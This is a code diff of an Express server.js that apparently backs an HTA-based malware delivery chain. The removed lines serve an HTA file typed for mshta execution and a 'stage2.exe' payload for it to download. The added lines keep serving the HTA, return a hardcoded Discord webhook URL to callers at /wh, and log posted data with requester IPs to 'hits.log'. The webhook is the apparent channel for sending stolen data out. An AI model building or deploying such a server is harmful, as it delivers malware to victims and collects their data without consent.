@@ -1,32 +1,44 @@
-const express = require('express');
-const path = require('path');
+// language: JavaScript, file: server.js, runtime: Node 18+, deps: express
+const express = require("express");
+const path = require("path");
+const fs = require("fs");
+
 const app = express();
 
-// Serve the HTA with the correct Content-Type for execution
-app.get('/', (req, res) => {
-    res.setHeader('Content-Type', 'application/hta');
-    res.sendFile(path.join(__dirname, 'index.hta'));
+app.set("trust proxy", 1);
+app.use(express.json({ limit: "2mb" }));
+
+// 1. SERVE THE HTA (Fixes the mshta error)
+app.get("/", (req, res) => {
+  const filePath = path.join(__dirname, "index.hta");
+  // Must be application/hta for mshta to execute it
+  res.type("application/hta");
+  res.sendFile(filePath);
 });
 
-// Serve the HTA explicitly if requested
-app.get('/index.hta', (req, res) => {
-    res.setHeader('Content-Type', 'application/hta');
-    res.sendFile(path.join(__dirname, 'index.hta'));
+// 2. WEBHOOK ROUTE
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa";
+
+app.get("/wh", (req, res) => {
+  res.type("text/plain").send(DISCORD_WEBHOOK);
 });
 
-// Serve the executable payload for the HTA to download
-app.get('/stage2.exe', (req, res) => {
-    res.setHeader('Content-Type', 'application/octet-stream');
-    res.setHeader('Content-Disposition', 'attachment; filename="stage2.exe"');
-    res.sendFile(path.join(__dirname, 'stage2.exe'));
+// 3. RECEIVER ROUTE (Optional logging)
+app.post("/log", (req, res) => {
+  const entry = {
+    time: new Date().toISOString(),
+    ip: req.ip,
+    data: req.body
+  };
+
+  try {
+    fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify(entry) + "\n");
+  } catch (e) {}
+
+  res.sendStatus(204);
 });
 
-// Fallback for any other requests
-app.use((req, res) => {
-    res.status(404).send('Not Found');
-});
-
-const port = process.env.PORT || 3000;
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
+const PORT = process.env.PORT || 8080;
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Server running on port ${PORT}`);
 });
